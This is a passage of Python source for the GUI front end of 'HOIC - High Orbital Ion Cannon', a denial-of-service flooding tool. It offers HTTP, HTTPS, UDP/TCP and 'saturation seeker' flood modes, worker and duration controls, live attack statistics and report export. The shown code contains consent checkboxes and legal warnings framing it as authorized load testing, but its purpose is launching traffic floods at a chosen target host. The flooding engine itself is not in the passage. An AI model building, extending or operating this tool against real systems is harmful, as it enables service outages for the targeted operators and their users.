        btn_frame = ctk.CTkFrame(left, fg_color="transparent")
        btn_frame.pack(fill="x", pady=16, padx=12)

        self.start_btn = ctk.CTkButton(
            btn_frame,
            text="▶ START ATTACK",
            fg_color="#cc2222",
            hover_color="#aa1111",
            height=42,
            font=ctk.CTkFont(size=15, weight="bold"),
            command=self.start_attack,
        )
        self.start_btn.pack(fill="x", pady=3)

        self.stop_btn = ctk.CTkButton(
            btn_frame,
            text="■ STOP",
            fg_color="#333333",
            hover_color="#222222",
            height=38,
            command=self.stop_attack,
        )
        self.stop_btn.pack(fill="x", pady=3)

        ctk.CTkButton(btn_frame, text="Test DNS / Resolve", command=self.resolve_target).pack(
            fill="x", pady=(8, 2)
        )
        ctk.CTkButton(btn_frame, text="Clear Log", command=self.clear_log).pack(fill="x", pady=2)
        ctk.CTkButton(btn_frame, text="Export Report", command=self.export_report).pack(
            fill="x", pady=(8, 2)
        )

        right = ctk.CTkFrame(main)
        right.pack(side="right", fill="both", expand=True, padx=(4, 8), pady=8)

        stats = ctk.CTkFrame(right)
        stats.pack(fill="x", padx=8, pady=6)

        ctk.CTkLabel(stats, text="LIVE STATS", font=ctk.CTkFont(size=14, weight="bold")).pack(
            anchor="w", padx=10, pady=(6, 2)
        )

        self.status_label = ctk.CTkLabel(
            stats, text="IDLE", font=ctk.CTkFont(size=18, weight="bold"), text_color="#66ff99"
        )
        self.status_label.pack(anchor="w", padx=10)

        stats_grid = ctk.CTkFrame(stats, fg_color="transparent")
        stats_grid.pack(fill="x", padx=8, pady=6)

        self.stat_sent = ctk.CTkLabel(stats_grid, text="Sent: 0", font=ctk.CTkFont(size=13))
        self.stat_sent.grid(row=0, column=0, padx=8, sticky="w")

        self.stat_rate = ctk.CTkLabel(stats_grid, text="Rate: 0 /s", font=ctk.CTkFont(size=13))
        self.stat_rate.grid(row=0, column=1, padx=8, sticky="w")

        self.stat_errors = ctk.CTkLabel(stats_grid, text="Errors: 0", font=ctk.CTkFont(size=13))
        self.stat_errors.grid(row=0, column=2, padx=8, sticky="w")

        self.stat_elapsed = ctk.CTkLabel(stats_grid, text="Elapsed: 0s", font=ctk.CTkFont(size=13))
        self.stat_elapsed.grid(row=1, column=0, padx=8, sticky="w")

        self.stat_p95 = ctk.CTkLabel(stats_grid, text="p95: —", font=ctk.CTkFont(size=13))
        self.stat_p95.grid(row=1, column=1, padx=8, sticky="w")

        self.stat_saturation = ctk.CTkLabel(
            stats_grid, text="Breakpoint: —", font=ctk.CTkFont(size=13), text_color="#88ccff"
        )
        self.stat_saturation.grid(row=1, column=2, padx=8, sticky="w")

        ctk.CTkLabel(right, text="ACTIVITY LOG", font=ctk.CTkFont(size=14, weight="bold")).pack(
            anchor="w", padx=12, pady=(4, 2)
        )

        self.log_text = scrolledtext.ScrolledText(
            right,
            height=22,
            bg="#111111",
            fg="#cccccc",
            insertbackground="#00ddff",
            font=("Consolas", 10),
        )
        self.log_text.pack(fill="both", expand=True, padx=8, pady=(0, 8))

        footer = ctk.CTkFrame(self.root, fg_color="transparent")
        footer.pack(fill="x", padx=12, pady=(0, 6))
        ctk.CTkLabel(
            footer,
            text="Wold Labs • Use responsibly • github.com/woldlabs/hoic",
            font=ctk.CTkFont(size=10),
            text_color="#555555",
        ).pack(side="left")
        ctk.CTkLabel(
            footer, text="Windows + Linux", font=ctk.CTkFont(size=10), text_color="#555555"
        ).pack(side="right")

        self._update_message_field_state(self.mode_var.get())

    def _read_workers_slider(self) -> int:
        return normalize_worker_count(self.workers_slider.get())

    def _update_message_field_state(self, mode: str):
        http_mode = mode_uses_http_message(mode)
        payload_mode = mode_uses_payload_message(mode)
        self.message_entry.configure(
            state="normal",
            text_color=("gray10", "gray90"),
        )
        if http_mode and payload_mode:
            hint = "HTTP POST body + headers; UDP uses HOICMSG: payload prefix"
            label = "ATTACK MESSAGE (HTTP + UDP in mixed mode)"
        elif http_mode:
            if mode == "HTTPS Flood":
                hint = "Sent in TLS-encrypted HTTP — use HTTP Flood for cleartext capture"
            else:
                hint = "Cleartext: POST body hoic_message=, X-HOIC-Message header, User-Agent"
            label = "ATTACK MESSAGE (HTTP — visible in cleartext capture)"
        elif payload_mode:
            hint = "Prepended as ASCII HOICMSG:yourtext| in each packet payload"
            label = "ATTACK MESSAGE (UDP/TCP payload prefix)"
        else:
            hint = "Optional marker embedded in attack traffic"
            label = "ATTACK MESSAGE"
        self.message_entry.configure(placeholder_text=hint)
        self.message_label.configure(text=label, text_color=("gray10", "gray90"))

    def show_legal_warning(self):
        result = messagebox.askokcancel(
            "HOIC Legal Warning",
            LEGAL_DISCLAIMER + "\n\nDo you confirm you will only use this tool with explicit permission?",
            icon="warning",
        )
        if not result:
            self.root.after(100, self.root.destroy)

    def _on_mode_change(self, choice: str):
        if "HTTPS" in choice:
            if self.port_entry.get() in ("80", "8080"):
                self.port_entry.delete(0, "end")
                self.port_entry.insert(0, "443")
        elif "HTTP" in choice and self.port_entry.get() == "443":
            self.port_entry.delete(0, "end")
            self.port_entry.insert(0, "80")
        if choice == "Adaptive Saturation Seeker":
            self.append_log(
                "Saturation Seeker: workers slider sets max search bound; "
                "duration should allow probe + resonance phases (60s+ recommended)"
            )
        self._update_message_field_state(choice)

    def resolve_target(self):
        host = self.target_entry.get().strip()
        if not host:
            return
        try:
            ip = socket.gethostbyname(host)
            self.append_log(f"Resolved {host} → {ip}")
            if not self.port_entry.get().strip():
                self.port_entry.insert(0, "80")
        except Exception as e:
            messagebox.showerror("Resolve Failed", str(e))

    def append_log(self, text: str):
        def _do():
            self.log_text.insert("end", text + "\n")
            self.log_text.see("end")

        self.root.after(0, _do)

    def clear_log(self):
        self.log_text.delete("1.0", "end")

    def _parse_port(self, value: str, default: int = 0) -> int:
        try:
            return int(value.strip())
        except (ValueError, AttributeError):
            return default

    def export_report(self):
        try:
            cfg = self.last_config
            stats = self.last_stats or {}
            log_content = self.log_text.get("1.0", "end").strip()

            ts = datetime.now().strftime("%Y%m%d-%H%M%S")
            default_name = f"hoic-report-{ts}.json"

            path = filedialog.asksaveasfilename(
                title="Export HOIC Report",
                initialfile=default_name,
                defaultextension=".json",
                filetypes=[("JSON Report", "*.json"), ("All files", "*.*")],
            )
            if not path:
                return

            report = {
                "timestamp": datetime.now().isoformat(),
                "tool": "HOIC - High Orbital Ion Cannon",
                "authorization_confirmed": bool(self.consent_var.get()),
                "authorization_note": self.note_entry.get().strip(),
                "target": {
                    "host": cfg.target_host if cfg else self.target_entry.get().strip(),
                    "port": cfg.target_port if cfg else self._parse_port(self.port_entry.get()),
                    "mode": cfg.mode if cfg else self.mode_var.get(),
                },
                "config": {
                    "workers": cfg.workers if cfg else self._read_workers_slider(),
                    "duration": cfg.duration if cfg else self._parse_port(self.duration_entry.get(), 0),
                    "packet_size": cfg.packet_size if cfg else self._parse_port(self.size_entry.get(), 1024),
                    "attack_message": cfg.attack_message if cfg else "",
                } if cfg else {},
                "stats": {
                    "sent": stats.get("sent", 0),
                    "errors": stats.get("errors", 0),
                    "elapsed": stats.get("elapsed", 0),
                    "rate": stats.get("rate", 0),
                    "latency": stats.get("latency", {}),
                    "saturation_point": stats.get("saturation_point"),
                    "probe_history": stats.get("probe_history", []),
                },
                "log_excerpt": log_content.splitlines()[-50:],
            }

            with open(path, "w", encoding="utf-8") as f:
                json.dump(report, f, indent=2)

            txt_path = path.rsplit(".", 1)[0] + ".txt"
            with open(txt_path, "w", encoding="utf-8") as f:
                f.write("HOIC Attack Report\n")
                f.write(f"Generated: {report['timestamp']}\n\n")
                f.write(
                    f"Target: {report['target']['host']}:{report['target']['port']} "
                    f"({report['target']['mode']})\n"
                )
                f.write(
                    f"Workers: {report['config'].get('workers', '?')} | "
                    f"Duration: {report['config'].get('duration', '?')}s\n\n"
                )
                f.write("Results:\n")
                f.write(f"  Sent: {report['stats']['sent']}\n")
                f.write(f"  Errors: {report['stats']['errors']}\n")
                f.write(f"  Avg Rate: {report['stats']['rate']:.1f}/s\n")
                f.write(f"  Elapsed: {report['stats']['elapsed']:.1f}s\n")
                lat = report["stats"].get("latency", {})
                if lat:
                    f.write(
                        f"  Latency p50/p95/p99: {lat.get('p50', 0):.0f}/"
                        f"{lat.get('p95', 0):.0f}/{lat.get('p99', 0):.0f} ms\n"
                    )
                if report["stats"].get("saturation_point") is not None:
                    f.write(f"  Saturation breakpoint: {report['stats']['saturation_point']} workers\n")
                f.write(
                    "\nNote: This report was generated for AUTHORIZED security research / "
                    "load testing only.\n"
                )

            self.append_log(f"Report exported: {path}")
            messagebox.showinfo("Report Exported", f"Saved:\n{path}\n{txt_path}")
        except Exception as e:
            messagebox.showerror("Export Failed", str(e))

    def update_stats(self, stats: dict):
        def _do():
            if not stats:
                return
            self.last_stats = stats.copy()
            self.stat_sent.configure(text=f"Sent: {stats.get('sent', 0)}")
            self.stat_errors.configure(text=f"Errors: {stats.get('errors', 0)}")
            self.stat_rate.configure(text=f"Rate: {stats.get('rate', 0):.1f} /s")
            self.stat_elapsed.configure(text=f"Elapsed: {int(stats.get('elapsed', 0))}s")

            lat = stats.get("latency", {})
            p95 = lat.get("p95", 0)
            self.stat_p95.configure(text=f"p95: {p95:.0f}ms" if p95 else "p95: —")

            sat = stats.get("saturation_point")
            self.stat_saturation.configure(
                text=f"Breakpoint: {sat}" if sat is not None else "Breakpoint: —"
            )

            if self.controller.running:
                self.status_label.configure(text="ATTACKING", text_color="#ff5555")
            else:
                self.status_label.configure(text="STOPPED", text_color="#ffaa66")

        self.root.after(0, _do)

    def get_config(self) -> Optional[AttackConfig]:
        host = self.target_entry.get().strip()
        if not host:
            messagebox.showerror("Error", "Target host is required")
            return None

        port = self._parse_port(self.port_entry.get())
        if port <= 0 or port > 65535:
            messagebox.showerror("Error", "Port must be between 1 and 65535")
            return None

        try:
            workers = self._read_workers_slider()
        except Exception:
            workers = WORKERS_DEFAULT

        try:
            duration = int(self.duration_entry.get().strip() or "0")
        except ValueError:
            duration = 60

        try:
            psize = int(self.size_entry.get().strip() or "1024")
        except ValueError:
            psize = 1024

        mode = self.mode_var.get()
        use_https = "HTTPS" in mode or (
            mode == "Adaptive Saturation Seeker" and port == 443
        )
        attack_message = self.message_var.get().strip()

        return AttackConfig(
            target_host=host,
            target_port=port,
            mode=mode,
            workers=workers,
            duration=duration,
            packet_size=psize,
            use_https=use_https,
            path="/",
            method="GET",
            attack_message=attack_message,
        )

    def start_attack(self):
        if not self.consent_var.get():
            messagebox.showerror(
                "Permission Required",
                "You must check the authorization checkbox before starting an attack.",
            )
            return

        cfg = self.get_config()
        if not cfg:
            return

        target_desc = f"{cfg.target_host}:{cfg.target_port} ({cfg.mode})"
        if not messagebox.askyesno(
            "Confirm Attack Launch",
            f"Launch attack on {target_desc}?\n\n"
            f"Workers: {cfg.workers}\nDuration: {cfg.duration}s\n\n"
            "Only proceed if you have explicit permission.",
        ):
            return

        self.status_label.configure(text="STARTING...", text_color="#ffcc00")
        self.append_log(f"Launching attack: {target_desc} with {cfg.workers} workers")

        self.last_config = cfg
        ok = self.controller.start(cfg)
        if ok:
            self.start_btn.configure(state="disabled", fg_color="#442222")
            self.stop_btn.configure(fg_color="#cc2222", hover_color="#aa1111")

    def stop_attack(self):
        self.controller.stop()
        self.start_btn.configure(state="normal", fg_color="#cc2222")
        self.stop_btn.configure(fg_color="#333333", hover_color="#222222")
        self.status_label.configure(text="IDLE", text_color="#66ff99")

    def run(self):
        try:
            logo_path = os.path.join(os.path.dirname(__file__), "assets", "hoic-logo-1.jpg")
            if os.path.exists(logo_path) and PILImage is not None:
                pil = PILImage.open(logo_path)
                if ImageTk is not None:
                    self.icon_img = ImageTk.PhotoImage(pil)
                    self.root.iconphoto(False, self.icon_img)
                else:
                    self.icon_img = tk.PhotoImage(file=logo_path)
                    self.root.iconphoto(False, self.icon_img)
            elif os.path.exists(logo_path):
                img = tk.PhotoImage(file=logo_path)
                self.root.iconphoto(False, img)
        except Exception:
            pass

        self.root.protocol("WM_DELETE_WINDOW", self._on_close)
        self.root.mainloop()

    def _on_close(self):
        if self.controller.running:
            if messagebox.askokcancel("Attack Running", "Stop current attack and exit?"):
                self.controller.stop()
                self.root.after(300, self.root.destroy)
        else:
            self.root.destroy()


# ============================================================
# ENTRY
# ============================================================

def main():
    print("HOIC - High Orbital Ion Cannon starting...")
    print("Remember: ONLY use with explicit permission on authorized targets.")
    app = HOICApp()
    app.run()


if __name__ == "__main__":
    main()